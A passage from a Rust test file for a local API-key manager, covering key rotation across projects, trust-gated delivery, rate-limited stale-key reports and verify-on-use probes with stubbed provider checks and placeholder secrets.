    let card = tasks::rotate(&ctx, &proj_a, "test", "GROQ_API_KEY", "default").unwrap();
    assert!(db.get_secret("GROQ_API_KEY", "default").unwrap().unwrap().stale);
    assert!(card.why.as_deref().unwrap().contains("rotate"));
    tasks::answer_secret(&ctx, &card, SecretString::from("gsk_new_bbbbbbbbbbbbbbbb".to_string()), true).unwrap();
    assert!(std::fs::read_to_string(proj_a.join(".env.local")).unwrap().contains("gsk_new_"));
    assert!(std::fs::read_to_string(proj_b.join(".env.local")).unwrap().contains("gsk_new_"), "project B still held the old value and must be rewritten");
    assert!(!std::fs::read_to_string(proj_b.join(".env.local")).unwrap().contains("gsk_old_"));
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

#[test]
fn report_bad_needs_standing_and_is_rate_limited() {
    let _g = env_lock();
    let (home, proj) = rot_ctx_home("report");
    let stranger = tmp("report-stranger").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    // an unregistered name: no liveness check, so the report itself decides
    let t = tasks::create_secret_task(&ctx, &proj, "test", "MY_CUSTOM_TOKEN", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t, SecretString::from("custom-aaaaaaaaaaaaaaaa".to_string()), true).unwrap();
    // a project that never received the key has no standing
    assert_eq!(tasks::report_bad(&ctx, &stranger, "evil", "MY_CUSTOM_TOKEN", "default", Some(401)).unwrap(), tasks::ReportOutcome::Ignored);
    assert!(!db.get_secret("MY_CUSTOM_TOKEN", "default").unwrap().unwrap().stale);
    // an unknown name is indistinguishable from an ignored one
    assert_eq!(tasks::report_bad(&ctx, &proj, "test", "NOT_A_KEY", "default", Some(401)).unwrap(), tasks::ReportOutcome::Ignored);
    // the delivering project can report; the message is scrubbed of the value
    let r = tasks::report_bad(&ctx, &proj, "test", "MY_CUSTOM_TOKEN", "default", Some(401)).unwrap();
    assert_eq!(r, tasks::ReportOutcome::MarkedStale);
    let m = db.get_secret("MY_CUSTOM_TOKEN", "default").unwrap().unwrap();
    assert!(m.stale);
    assert!(m.stale_reason.as_deref().unwrap().contains("by test in"), "{:?}", m.stale_reason);
    let audit = db.recent_audit(5).unwrap();
    assert!(audit.iter().any(|a| a.3 == "report"));
    assert!(audit.iter().all(|a| !a.6.as_deref().unwrap_or("").contains("custom-")), "only the status is persisted, never provider text");
    // a second report inside the TTL is ignored (cooldown)
    db.mark_stale("MY_CUSTOM_TOKEN", "default", false, None, Some(db::STALE_REPORT)).unwrap();
    assert_eq!(tasks::report_bad(&ctx, &proj, "test", "MY_CUSTOM_TOKEN", "default", Some(401)).unwrap(), tasks::ReportOutcome::Ignored);
    assert!(!db.get_secret("MY_CUSTOM_TOKEN", "default").unwrap().unwrap().stale);
    // ...but a report about a NEWLY stored value is not shadowed by the old cooldown
    std::thread::sleep(std::time::Duration::from_millis(1100));
    let t2 = tasks::create_secret_task(&ctx, &proj, "test", "MY_CUSTOM_TOKEN", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t2, SecretString::from("custom-bbbbbbbbbbbbbbbb".to_string()), true).unwrap();
    std::thread::sleep(std::time::Duration::from_millis(1100));
    assert_eq!(tasks::report_bad(&ctx, &proj, "test", "MY_CUSTOM_TOKEN", "default", Some(401)).unwrap(), tasks::ReportOutcome::MarkedStale, "cooldown must reset when the value changes");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}


#[test]
fn a_probe_ok_never_cancels_a_human_rotation() {
    let dir = tmp("rotate-vs-verify");
    let db = Db::open(&dir.join("t.db")).unwrap();
    db.upsert_secret(&db::SecretMeta { name: "K".into(), identity: "default".into(), provider: None, sensitive: false, source_url: None, created: now(), last_used: None, stale: false, last_verified: None, stale_reason: None, stale_source: None, next_probe: None, verify_off: false }).unwrap();
    db.mark_stale("K", "default", true, Some(Db::ROTATE_REASON), Some(db::STALE_ROTATE)).unwrap();
    db.set_verified("K", "default").unwrap();
    let m = db.get_secret("K", "default").unwrap().unwrap();
    assert!(m.stale, "a human rotation survives a probe saying the old key is still live");
    assert!(m.last_verified.is_some());
    // a report-driven stale IS cleared by a probe Ok
    db.mark_stale("K", "default", true, Some("rejected by X (HTTP 401) ..."), Some(db::STALE_REPORT)).unwrap();
    db.set_verified("K", "default").unwrap();
    assert!(!db.get_secret("K", "default").unwrap().unwrap().stale);
}

#[test]
fn a_stale_key_still_goes_through_the_trust_gate_and_generated_names_regenerate() {
    let _g = env_lock();
    let (home, proj) = rot_ctx_home("stale-gate");
    let outside = tmp("stale-gate-outside").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let t = tasks::create_secret_task(&ctx, &proj, "test", "OPENAI_API_KEY", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t, SecretString::from("sk-old-aaaaaaaaaaaaaaaa".to_string()), true).unwrap();
    db.mark_stale("OPENAI_API_KEY", "default", true, Some("rejected ..."), Some(db::STALE_REPORT)).unwrap();
    // outside the trust roots: an APPROVAL card, not a paste card into the stranger's file
    let out = need::need(&ctx, &outside, "test", &["OPENAI_API_KEY".to_string()], &Default::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    assert_eq!(db.get_task(&tid).unwrap().unwrap().kind, db::TaskKind::Approval);
    assert!(!outside.join(".env.local").exists());
    // generated secrets never become paste cards: a stale AUTH_SECRET regenerates.
    // They are stored per project directory, so the identity is the project's, not "default".
    let gid = need::project_identity(&proj);
    need::need(&ctx, &proj, "test", &["AUTH_SECRET".to_string()], &Default::default()).unwrap();
    db.mark_stale("AUTH_SECRET", &gid, true, Some("reported ..."), Some(db::STALE_REPORT)).unwrap();
    let out = need::need(&ctx, &proj, "test", &["AUTH_SECRET".to_string()], &Default::default()).unwrap();
    assert!(matches!(&out[0], need::Outcome::Injected { generated: true, .. }), "{:?}", out[0]);
    assert!(!db.get_secret("AUTH_SECRET", &gid).unwrap().unwrap().stale);
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}

#[test]
fn rotation_reports_projects_it_could_not_rewrite() {
    let _g = env_lock();
    let (home, proj_a) = rot_ctx_home("rotate-skip");
    let proj_b = tmp("rotate-skip-b").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let t = tasks::create_secret_task(&ctx, &proj_a, "test", "GROQ_API_KEY", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t, SecretString::from("gsk_old_aaaaaaaaaaaaaaaa".to_string()), true).unwrap();
    pair(&db, &proj_b, "GROQ_API_KEY");
    need::need(&ctx, &proj_b, "test", &["GROQ_API_KEY".to_string()], &Default::default()).unwrap();
    // B commits its env file (the classic mistake) → the rewrite must refuse and say so
    init_git(&proj_b);
    git(&proj_b, &["add", "-f", ".env.local"]);
    git(&proj_b, &["commit", "-q", "-m", "oops"]);
    let card = tasks::rotate(&ctx, &proj_a, "human", "GROQ_API_KEY", "default").unwrap();
    let r = tasks::answer_secret(&ctx, &card, SecretString::from("gsk_new_bbbbbbbbbbbbbbbb".to_string()), true).unwrap();
    let tasks::AnswerResult::Stored { rotation: Some(rep), .. } = r else { panic!("expected a rotation report") };
    assert_eq!(rep.skipped.len(), 1, "{rep:?}");
    assert!(rep.skipped[0].0 == proj_b.to_string_lossy() && rep.skipped[0].1.contains("tracked by git"));
    assert!(std::fs::read_to_string(proj_b.join(".env.local")).unwrap().contains("gsk_old_"), "B keeps the old value and the human is told");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}


#[test]
fn rotation_never_rewrites_a_project_without_a_standing_grant_and_ordinary_pastes_are_not_rotations() {
    let _g = env_lock();
    let (home, proj_a) = rot_ctx_home("rotate-gate");
    let proj_b = tmp("rotate-gate-b").canonicalize().unwrap();
    // B is outside the trust roots: it received the key once via a one-time (run) approval
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let t = tasks::create_secret_task(&ctx, &proj_a, "test", "GROQ_API_KEY", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t, SecretString::from("gsk_old_aaaaaaaaaaaaaaaa".to_string()), true).unwrap();
    let ws_b = db.workspace_for(&proj_b).unwrap();
    let once = tasks::create_approval_task(&ctx, &proj_b, "run", &["GROQ_API_KEY@default".to_string()], tasks::ApprovalKind::Once).unwrap();
    tasks::answer_approval(&ctx, &once, tasks::Decision::Allow, None).unwrap();
    assert!(std::fs::read_to_string(proj_b.join(".env.local")).unwrap().contains("gsk_old_"));
    assert!(db.grant_source(&ws_b.id, "GROQ_API_KEY", "default").unwrap().is_none(), "one-time approval left no grant");
    // rotate from A: B must NOT be rewritten, and the human is told
    let card = tasks::rotate(&ctx, &proj_a, "human", "GROQ_API_KEY", "default").unwrap();
    let r = tasks::answer_secret(&ctx, &card, SecretString::from("gsk_new_bbbbbbbbbbbbbbbb".to_string()), true).unwrap();
    let tasks::AnswerResult::Stored { rotation: Some(rep), .. } = r else { panic!() };
    assert!(rep.skipped.iter().any(|(p, why)| p == &proj_b.to_string_lossy() && why.contains("no standing grant")), "{rep:?}");
    assert!(std::fs::read_to_string(proj_b.join(".env.local")).unwrap().contains("gsk_old_"));
    // an ordinary paste in another project with a different value is NOT a rotation
    let proj_c = tmp("rotate-gate-c").canonicalize().unwrap();
    let cfg2 = Config::default();
    let ctx2 = tasks::Ctx { cfg: &cfg2, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    let tc = tasks::create_secret_task(&ctx2, &proj_c, "test", "OTHER_KEY", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx2, &tc, SecretString::from("other-aaaaaaaaaaaaaaaa".to_string()), true).unwrap();
    need::need(&ctx2, &proj_a, "test", &["OTHER_KEY".to_string()], &Default::default()).unwrap();
    let ta = tasks::create_secret_task(&ctx2, &proj_a, "test", "OTHER_KEY", "default", &Default::default()).unwrap();
    let r = tasks::answer_secret(&ctx2, &ta, SecretString::from("other-bbbbbbbbbbbbbbbb".to_string()), true).unwrap();
    let tasks::AnswerResult::Stored { rotation, .. } = r else { panic!() };
    assert!(rotation.is_none(), "a fresh paste is not a rotation");
    assert!(std::fs::read_to_string(proj_c.join(".env.local")).unwrap().contains("other-aaaa"), "C keeps its own value");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}


#[test]
fn an_ordinary_card_answered_after_a_stale_mark_elsewhere_does_not_propagate() {
    let _g = env_lock();
    let (home, proj_a) = rot_ctx_home("ordinary-vs-stale");
    let proj_b = tmp("ordinary-vs-stale-b").canonicalize().unwrap();
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Off };
    // A stores and B receives the key
    let t = tasks::create_secret_task(&ctx, &proj_a, "test", "GROQ_API_KEY", "default", &Default::default()).unwrap();
    tasks::answer_secret(&ctx, &t, SecretString::from("gsk_old_aaaaaaaaaaaaaaaa".to_string()), true).unwrap();
    pair(&db, &proj_b, "GROQ_API_KEY");
    need::need(&ctx, &proj_b, "test", &["GROQ_API_KEY".to_string()], &Default::default()).unwrap();
    // an ORDINARY card is filed in a third project (say the key was forgotten there and re-requested by hand)
    let proj_c = tmp("ordinary-vs-stale-c").canonicalize().unwrap();
    let ordinary = tasks::create_secret_task(&ctx, &proj_c, "test", "GROQ_API_KEY", "default", &Default::default()).unwrap();
    assert_ne!(ordinary.expects, tasks::EXPECTS_REPLACE);
    // meanwhile the key is marked stale by a report elsewhere
    db.mark_stale("GROQ_API_KEY", "default", true, Some("reported ..."), Some(db::STALE_REPORT)).unwrap();
    // answering the ordinary card must not rewrite A and B
    let r = tasks::answer_secret(&ctx, &ordinary, SecretString::from("gsk_new_cccccccccccccccc".to_string()), true).unwrap();
    let tasks::AnswerResult::Stored { rotation, .. } = r else { panic!() };
    assert!(rotation.is_none());
    assert!(std::fs::read_to_string(proj_b.join(".env.local")).unwrap().contains("gsk_old_"), "B untouched by an ordinary answer");
    // a REPLACEMENT card (the stale-miss branch) does propagate
    db.mark_stale("GROQ_API_KEY", "default", true, Some("reported ..."), Some(db::STALE_REPORT)).unwrap();
    let out = need::need(&ctx, &proj_a, "test", &["GROQ_API_KEY".to_string()], &Default::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    let card = db.get_task(&tid).unwrap().unwrap();
    assert_eq!(card.expects, tasks::EXPECTS_REPLACE);
    tasks::answer_secret(&ctx, &card, SecretString::from("gsk_new_dddddddddddddddd".to_string()), true).unwrap();
    assert!(std::fs::read_to_string(proj_b.join(".env.local")).unwrap().contains("gsk_new_dddd"), "B held the ORIGINAL stale value (the ordinary answer changed the stash in between); the replacement still reaches it");
    std::env::set_var("TOKENSTASH_HOME", base_home()); std::env::remove_var("TOKENSTASH_STASH");
}


// ---------------------------------------------------------------------------------------
// verify-on-use: a stored key is re-checked with its provider before delivery, when due

fn verify_setup(tag: &str) -> (PathBuf, PathBuf) {
    let home = tmp(&format!("verify-{tag}-home"));
    std::env::set_var("TOKENSTASH_HOME", &home);
    std::env::set_var("TOKENSTASH_STASH", "insecure-file");
    let proj = tmp(&format!("verify-{tag}-proj")).canonicalize().unwrap();
    (home, proj)
}

fn seed(db: &Db, stash: &dyn stash::Stash, proj: &std::path::Path, name: &str, value: &str, last_verified: Option<String>) {
    stash.set(&stash::stash_key(name, "default"), &SecretString::from(value.to_string())).unwrap();
    pair(db, proj, name);
    db.upsert_secret(&db::SecretMeta { name: name.into(), identity: "default".into(), provider: None, sensitive: false, source_url: None, created: now(), last_used: None, stale: false, last_verified, stale_reason: None, stale_source: None, next_probe: None, verify_off: false }).unwrap();
}

#[test]
fn at_use_rejection_becomes_a_replace_card_and_writes_nothing() {
    let _env = env_lock();
    let (home, proj) = verify_setup("reject");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let calls = std::cell::Cell::new(0);
    let stub = |c: &registry::Check| { calls.set(calls.get() + 1); assert!(c.url.contains("api.openai.com")); validate::Liveness::Rejected(401) };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    seed(&db, stash.as_ref(), &proj, "OPENAI_API_KEY", "sk-dead-aaaaaaaaaaaaaaaaaaaa", None);
    let out = need::need(&ctx, &proj, "claude-code", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let (tid, title) = match &out[0] { need::Outcome::Pending { task_id, title, .. } => (task_id.clone(), title.clone()), o => panic!("expected a replace card, got {o:?}") };
    assert_eq!(calls.get(), 1);
    assert!(!envfile::has(&proj, ".env.local", "OPENAI_API_KEY"), "a rejected key must not be written");
    let t = db.get_task(&tid).unwrap().unwrap();
    assert_eq!(t.expects, tasks::EXPECTS_REPLACE, "{title}");
    assert!(t.why.as_deref().unwrap_or("").contains("rejected by OpenAI (HTTP 401)"), "{:?}", t.why);
    assert!(t.why.as_deref().unwrap_or("").contains("found at use by claude-code"));
    let m = db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap();
    assert!(m.stale);
    assert_eq!(m.stale_source.as_deref(), Some(db::STALE_PROBE));
    assert!(db.recent_audit(10).unwrap().iter().any(|r| r.3 == "probe.rejected"));
    // the value stays: a paste of the same value that the provider now accepts self-heals
    assert!(stash.get(&stash::stash_key("OPENAI_API_KEY", "default")).unwrap().is_some());
    // a stale key is never probed again on the next call; the card is simply reused
    let out2 = need::need(&ctx, &proj, "claude-code", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(&out2[0], need::Outcome::Pending { task_id, .. } if *task_id == tid));
    assert_eq!(calls.get(), 1);
}

#[test]
fn at_use_ok_refreshes_and_respects_the_window() {
    let _env = env_lock();
    let (home, proj) = verify_setup("ok");
    let cfg = Config::default();
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let calls = std::cell::Cell::new(0);
    let stub = |_: &registry::Check| { calls.set(calls.get() + 1); validate::Liveness::Ok };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    seed(&db, stash.as_ref(), &proj, "OPENAI_API_KEY", "sk-live-aaaaaaaaaaaaaaaaaaaa", None);
    let names = ["OPENAI_API_KEY".to_string()];
    let out = need::need(&ctx, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { unverified: false, .. }), "{out:?}");
    assert_eq!(calls.get(), 1);
    let m = db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap();
    assert!(m.last_verified.is_some());
    assert!(m.next_probe.as_deref().unwrap() > now().as_str(), "an Ok leaves the one-minute floor, nothing longer");
    let in_2m = (chrono::Utc::now() + chrono::Duration::minutes(2)).to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
    assert!(m.next_probe.as_deref().unwrap() < in_2m.as_str(), "the window itself comes from last_verified");
    // inside the window: no second probe
    need::need(&ctx, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    assert_eq!(calls.get(), 1);
    // an old timestamp is due again; so is a future one (clock moved back) or garbage
    for stamp in ["2020-01-01T00:00:00Z", "2999-01-01T00:00:00Z", "not a date"] {
        db.conn.execute("UPDATE secrets SET last_verified=?1, next_probe=NULL", [stamp]).unwrap();
        let before = calls.get();
        need::need(&ctx, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
        assert_eq!(calls.get(), before + 1, "{stamp} must count as unverified");
    }
    // `always` probes every call; `never` never does
    let cfg_always = Config { verify_every: config::VerifyEvery::Always, ..cfg.clone() };
    let ctx_a = tasks::Ctx { cfg: &cfg_always, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    let before = calls.get();
    db.conn.execute("UPDATE secrets SET next_probe=NULL", []).unwrap();
    need::need(&ctx_a, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    // ...but never more than once a minute: a `need` loop is not a request loop
    let out = need::need(&ctx_a, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { unverified: true, .. }), "inside the floor the caller is told it was not re-checked");
    assert_eq!(calls.get(), before + 1);
    db.conn.execute("UPDATE secrets SET next_probe=NULL", []).unwrap();
    need::need(&ctx_a, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    assert_eq!(calls.get(), before + 2);
    let cfg_never = Config { verify_every: config::VerifyEvery::Never, ..cfg.clone() };
    let ctx_n = tasks::Ctx { cfg: &cfg_never, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    db.conn.execute("UPDATE secrets SET last_verified=NULL, next_probe=NULL", []).unwrap();
    need::need(&ctx_n, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    assert_eq!(calls.get(), before + 2);
}

#[test]
fn at_use_unknown_delivers_unverified_with_backoff() {
    let _env = env_lock();
    let (home, proj) = verify_setup("unknown");
    let cfg = Config { verify_every: config::VerifyEvery::Always, ..Default::default() };
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let calls = std::cell::Cell::new(0);
    let verdict = std::cell::RefCell::new(validate::Liveness::Unknown("HTTP 503".into()));
    let stub = |_: &registry::Check| { calls.set(calls.get() + 1); verdict.borrow().clone() };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    seed(&db, stash.as_ref(), &proj, "OPENAI_API_KEY", "sk-live-aaaaaaaaaaaaaaaaaaaa", None);
    let names = ["OPENAI_API_KEY".to_string()];
    let out = need::need(&ctx, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { unverified: true, .. }), "{out:?}");
    assert!(envfile::has(&proj, ".env.local", "OPENAI_API_KEY"), "an outage must not block delivery");
    let m = db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap();
    assert!(m.last_verified.is_none());
    let np = m.next_probe.clone().unwrap();
    assert!(np > now(), "backoff recorded");
    // inside the backoff even `always` does not probe, and the caller is told
    let out = need::need(&ctx, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { unverified: true, .. }));
    assert_eq!(calls.get(), 1);
    // rate-limited: a much longer backoff than an outage
    db.conn.execute("UPDATE secrets SET next_probe=NULL", []).unwrap();
    *verdict.borrow_mut() = validate::Liveness::Unknown("HTTP 429".into());
    need::need(&ctx, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    let m = db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap();
    let in_50m = (chrono::Utc::now() + chrono::Duration::minutes(50)).to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
    assert!(m.next_probe.unwrap() > in_50m, "429 backs off for an hour, not ten minutes");
    // 403 is a verdict that will not change: a restricted key waits a whole window
    let cfg_day = Config::default();
    let ctx_d = tasks::Ctx { cfg: &cfg_day, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    db.conn.execute("UPDATE secrets SET next_probe=NULL", []).unwrap();
    *verdict.borrow_mut() = validate::Liveness::Unknown("HTTP 403".into());
    need::need(&ctx_d, &proj, "t", &names, &need::NeedOpts::default()).unwrap();
    let m = db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap();
    let in_23h = (chrono::Utc::now() + chrono::Duration::hours(23)).to_rfc3339_opts(chrono::SecondsFormat::Secs, true);
    assert!(m.next_probe.unwrap() > in_23h, "403 waits a full window");
    assert!(!m.stale, "403 never stales a key");
}

#[test]
fn at_use_probe_is_skipped_when_not_allowed() {
    let _env = env_lock();
    let (home, proj) = verify_setup("skip");
    let cfg = Config { verify_every: config::VerifyEvery::Always, ..Default::default() };
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let calls = std::cell::Cell::new(0);
    let stub = |_: &registry::Check| { calls.set(calls.get() + 1); validate::Liveness::Rejected(401) };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    // registry says not at use (generic 400 reject / metered)
    assert!(registry::lookup("GEMINI_API_KEY").unwrap().check.as_ref().map(|c| !c.at_use).unwrap());
    assert!(registry::lookup("BRAVE_API_KEY").unwrap().check.as_ref().map(|c| !c.at_use).unwrap());
    seed(&db, stash.as_ref(), &proj, "GEMINI_API_KEY", "AIzaSyDEADDEADDEADDEADDEADDEAD", None);
    let out = need::need(&ctx, &proj, "t", &["GEMINI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { unverified: false, .. }));
    // no registry check at all
    seed(&db, stash.as_ref(), &proj, "MY_CUSTOM_TOKEN", "custom-token-value-1234567890", None);
    need::need(&ctx, &proj, "t", &["MY_CUSTOM_TOKEN".to_string()], &need::NeedOpts::default()).unwrap();
    // the human stored it with --skip-check: verify_off
    seed(&db, stash.as_ref(), &proj, "OPENAI_API_KEY", "sk-skip-aaaaaaaaaaaaaaaaaaaa", None);
    db.set_verify_off("OPENAI_API_KEY", "default", true).unwrap();
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }), "{out:?}");
    // a project that needs approval gets no probe: the probe transmits the key
    // a directory without a grant gets no probe: the probe transmits the key
    let cfg_untrusted = Config { verify_every: config::VerifyEvery::Always, ..Default::default() };
    let ctx_u = tasks::Ctx { cfg: &cfg_untrusted, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    db.revoke_workspace(&db.find_workspace(&proj).unwrap().unwrap().id).unwrap();
    std::fs::remove_file(proj.join(".env.local")).unwrap(); // else on-disk equivalence would open it
    db.set_verify_off("OPENAI_API_KEY", "default", false).unwrap();
    let out = need::need(&ctx_u, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Pending { .. }));
    // a human-requested rotation is not re-probed either
    db.mark_stale("OPENAI_API_KEY", "default", true, Some(Db::ROTATE_REASON), Some(db::STALE_ROTATE)).unwrap();
    need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert_eq!(calls.get(), 0, "no probe may have run in this test");
}

#[test]
fn skip_check_store_turns_verify_off_until_a_probe_says_ok() {
    let _env = env_lock();
    let (home, proj) = verify_setup("skipcheck");
    let cfg = Config { verify_every: config::VerifyEvery::Always, ..Default::default() };
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let calls = std::cell::Cell::new(0);
    let stub = |_: &registry::Check| { calls.set(calls.get() + 1); validate::Liveness::Rejected(401) };
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    // with the check: the paste itself is refused
    let t = db.get_task(&tid).unwrap().unwrap();
    assert!(tasks::answer_secret(&ctx, &t, SecretString::from("sk-restricted-aaaaaaaaaaaaaa".to_string()), false).is_err());
    assert_eq!(calls.get(), 1);
    // --skip-check: stored, and verify-on-use is off for this key
    tasks::answer_secret(&ctx, &t, SecretString::from("sk-restricted-aaaaaaaaaaaaaa".to_string()), true).unwrap();
    let m = db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap();
    assert!(m.verify_off);
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    assert!(matches!(out[0], need::Outcome::Injected { .. }), "a key the human stored past the check must not be re-rejected: {out:?}");
    assert_eq!(calls.get(), 1);
    // a probe that says Ok (e.g. `check`) turns it back on
    db.set_verified("OPENAI_API_KEY", "default").unwrap();
    assert!(!db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap().verify_off);
}

#[test]
fn approval_delivery_is_verified_too() {
    let _env = env_lock();
    let (home, proj) = verify_setup("approval");
    let cfg = Config { verify_every: config::VerifyEvery::Always, ..Default::default() };
    let db = Db::open(&home.join("t.db")).unwrap();
    let stash = stash::open(&cfg).unwrap();
    let stub = |_: &registry::Check| validate::Liveness::Rejected(401);
    let ctx = tasks::Ctx { cfg: &cfg, db: &db, stash: stash.as_ref(), probe: tasks::Probe::Stub(&stub) };
    // stored, but never paired into this directory: the pairing card comes first
    stash.set(&stash::stash_key("OPENAI_API_KEY", "default"), &SecretString::from("sk-dead-aaaaaaaaaaaaaaaaaaaa".to_string())).unwrap();
    db.upsert_secret(&db::SecretMeta { name: "OPENAI_API_KEY".into(), identity: "default".into(), provider: None, sensitive: false, source_url: None, created: now(), last_used: None, stale: false, last_verified: None, stale_reason: None, stale_source: None, next_probe: None, verify_off: false }).unwrap();
    let out = need::need(&ctx, &proj, "t", &["OPENAI_API_KEY".to_string()], &need::NeedOpts::default()).unwrap();
    let tid = match &out[0] { need::Outcome::Pending { task_id, .. } => task_id.clone(), o => panic!("{o:?}") };
    assert!(tid.starts_with("a_"), "unpaired directory: pairing card first");
    match tasks::answer_approval(&ctx, &db.get_task(&tid).unwrap().unwrap(), tasks::Decision::Allow, None).unwrap() {
        tasks::AnswerResult::Approved { injected, replaced } => { assert!(injected.is_empty()); assert_eq!(replaced, vec!["OPENAI_API_KEY".to_string()]); }
        o => panic!("{o:?}"),
    }
    assert!(!envfile::has(&proj, ".env.local", "OPENAI_API_KEY"), "approval must not bypass the probe");
    assert!(db.get_secret("OPENAI_API_KEY", "default").unwrap().unwrap().stale);
    let pid = proj.to_string_lossy().to_string();
    let rt = db.open_secret_task(&pid, "OPENAI_API_KEY", "default").unwrap().expect("replacement card filed for this project");
    assert_eq!(rt.expects, tasks::EXPECTS_REPLACE);
    // the agent's `wait` now sees the approval Answered — and must not inject the dead key
    let mut outcomes = vec![need::Outcome::Pending { name: "OPENAI_API_KEY".into(), identity: "default".into(), task_id: tid.clone(), title: String::new(), url: None }];
    need::wait(&ctx, &proj, &mut outcomes, std::time::Duration::from_millis(10)).unwrap();
    match &outcomes[0] {
        need::Outcome::Pending { task_id, .. } => assert_eq!(*task_id, rt.id, "wait re-pends on the Replace card"),
        o => panic!("wait must not inject a stale key: {o:?}"),
    }
    assert!(!envfile::has(&proj, ".env.local", "OPENAI_API_KEY"));
}

#[test]
fn a_verdict_for_a_value_no_longer_stored_is_discarded() {
    let _env = env_lock();
    let (home, proj) = verify_setup("race");
